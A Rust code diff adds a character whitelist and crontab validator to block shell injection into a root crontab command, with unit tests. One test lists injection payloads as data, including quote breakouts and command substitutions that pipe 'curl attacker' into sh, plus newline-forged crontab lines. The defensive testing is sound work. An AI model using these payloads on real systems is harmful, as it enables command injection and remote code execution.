@@ -57,26 +57,88 @@ pub struct CreateAutotaskRequest {
     pub timezone: Option<String>,
 }
 
+/// A schedule that passed the strict grammar check (#2824).
+///
+/// `normalized` is the five-field expression rebuilt from the validated
+/// fields with single spaces. It is the only form that may be interpolated
+/// into a shell command; raw user input is never passed to the workspace.
+pub(super) struct ValidatedSchedule {
+    pub(super) normalized: String,
+    pub(super) next_run_at: Option<DateTime<Utc>>,
+}
+
+/// Character whitelist for a crontab expression (#2824).
+///
+/// Only digits, the cron operators (`* / , -`), ASCII letters (month/day
+/// names) and horizontal whitespace are allowed. Quotes, `;`, `|`, `$`,
+/// parentheses, backticks, `#`, CR/LF and every other shell metacharacter
+/// are rejected before the value can reach a root shell command.
+pub(super) fn is_safe_cron_text(schedule: &str) -> bool {
+    !schedule.is_empty()
+        && schedule.bytes().all(|byte| {
+            byte.is_ascii_alphanumeric() || matches!(byte, b'*' | b'/' | b',' | b'-' | b' ' | b'\t')
+        })
+}
+
+#[cfg(feature = "automation")]
+fn parse_cron(schedule: &str) -> Option<cron::Schedule> {
+    use std::str::FromStr;
+    // Users and crontab write five fields (`0 9 * * 1`); the cron crate
+    // parses six or seven (seconds first). Normalize instead of rejecting
+    // every standard crontab entry.
+    let fields = schedule.split_whitespace().count();
+    let normalized = if fields == 5 {
+        format!("0 {schedule}")
+    } else {
+        schedule.to_string()
+    };
+    cron::Schedule::from_str(&normalized).ok()
+}
+
 pub(super) fn next_run_for(schedule: &str) -> Option<DateTime<Utc>> {
     #[cfg(feature = "automation")]
     {
-        use std::str::FromStr;
-        // Users and crontab write five fields (`0 9 * * 1`); the cron crate
-        // parses six or seven (seconds first). Normalize instead of rejecting
-        // every standard crontab entry.
-        let fields = schedule.split_whitespace().count();
-        let normalized = if fields == 5 {
-            format!("0 {schedule}")
-        } else {
-            schedule.to_string()
-        };
-        let parsed = cron::Schedule::from_str(&normalized).ok()?;
-        return parsed.after(&Utc::now()).next();
+        let parsed = parse_cron(schedule)?;
+        parsed.after(&Utc::now()).next()
     }
     #[cfg(not(feature = "automation"))]
     {
         let _ = schedule;
         None
+    }
+}
+
+/// Validates a user-supplied crontab expression before it is embedded in a
+/// root shell snippet (#2824).
+///
+/// The character whitelist keeps shell metacharacters and newlines out, the
+/// five-field check enforces crontab shape, and the `cron` crate rejects
+/// malformed ranges/steps/names that the whitelist alone cannot catch. The
+/// normalized expression is returned so callers interpolate that, never the
+/// original input.
+pub(super) fn validate_schedule(schedule: &str) -> Option<ValidatedSchedule> {
+    if !is_safe_cron_text(schedule) {
+        return None;
+    }
+    let fields: Vec<&str> = schedule.split_whitespace().collect();
+    if fields.len() != 5 || fields.iter().any(|field| field.is_empty()) {
+        return None;
+    }
+    let normalized = fields.join(" ");
+    #[cfg(feature = "automation")]
+    {
+        let parsed = parse_cron(&normalized)?;
+        Some(ValidatedSchedule {
+            normalized,
+            next_run_at: parsed.after(&Utc::now()).next(),
+        })
+    }
+    #[cfg(not(feature = "automation"))]
+    {
+        Some(ValidatedSchedule {
+            normalized,
+            next_run_at: None,
+        })
     }
 }
 
@@ -99,7 +161,7 @@ pub(super) fn respond(rows: &[AutotaskRow]) -> Value {
 
 #[cfg(test)]
 mod tests {
-    use super::{next_run_for, respond, AutotaskRow};
+    use super::{is_safe_cron_text, next_run_for, respond, validate_schedule, AutotaskRow};
     use crate::main_module::routes::conversation_autotasks::{
         STATUS_ORPHANED, STATUS_RUNNING, STATUS_SCHEDULED, STATUS_STOPPED,
     };
@@ -172,6 +234,65 @@ mod tests {
             crate::main_module::routes::conversation_autotasks::workspace::conversation_root(id),
             "/opt/vibe/conversations/00000000-0000-0000-0000-000000000000"
         );
+    }
+
+    /// #2824: a valid five-field crontab expression is normalized and accepts.
+    #[test]
+    fn validate_schedule_accepts_a_valid_cron_expression() {
+        let validated = validate_schedule("0 9 * * 1").expect("valid cron");
+        assert_eq!(validated.normalized, "0 9 * * 1");
+        #[cfg(feature = "automation")]
+        assert!(validated.next_run_at.is_some());
+        // Multiple/tabbed separators are normalized to single spaces.
+        assert_eq!(
+            validate_schedule("0\t9  *   *\t1")
+                .expect("whitespace is normalized")
+                .normalized,
+            "0 9 * * 1"
+        );
+        // Steps, ranges, lists, month and day names are cron grammar.
+        assert!(validate_schedule("*/15 0-4 1,15 JAN MON-FRI").is_some());
+    }
+
+    /// #2824: every payload that could break out of the single-quoted crontab
+    /// line in `workspace.rs` must be rejected before any shell interpolation.
+    #[test]
+    fn validate_schedule_rejects_shell_injection_payloads() {
+        let attacks = [
+            "x'; curl attacker|sh; echo '", // quote breakout + pipe
+            "0 9 * * 1; curl attacker|sh",  // trailing command separator
+            "0 9 * * 1 && curl attacker",   // command chain
+            "0 9 * * $(curl attacker)",     // command substitution
+            "0 9 * * `curl attacker`",
+            "0 9 \"* * 1",               // double quote
+            "0 9 \\* * 1",               // backslash escape
+            "0 9 * * 1\n0 0 * * *",      // newline forges a crontab line
+            "0 9 * * 1\r0 0 * * *",      // carriage return
+            "0 9 * * 1 # gb-autotask:x", // comment marker forgery
+            "0 9 * * <(curl attacker)",  // process substitution
+        ];
+        for payload in attacks {
+            assert!(
+                validate_schedule(payload).is_none(),
+                "injection payload must be rejected: {payload:?}"
+            );
+            assert!(
+                !is_safe_cron_text(payload),
+                "payload must fail the character whitelist: {payload:?}"
+            );
+        }
+    }
+
+    /// #2824: shape and grammar checks reject non-crontab input that contains
+    /// only whitelisted characters.
+    #[test]
+    fn validate_schedule_rejects_wrong_shape_and_non_cron_text() {
+        assert!(validate_schedule("").is_none());
+        assert!(validate_schedule("   ").is_none());
+        assert!(validate_schedule("0 9 * *").is_none()); // four fields
+        assert!(validate_schedule("0 0 9 * * 1").is_none()); // six fields
+        assert!(validate_schedule("curl x y z w").is_none()); // letters, not cron
+        assert!(validate_schedule("99 9 * * 1").is_none()); // out of range
     }
 
     /// Reconciliation depends on a parseable schedule; an invalid one must not
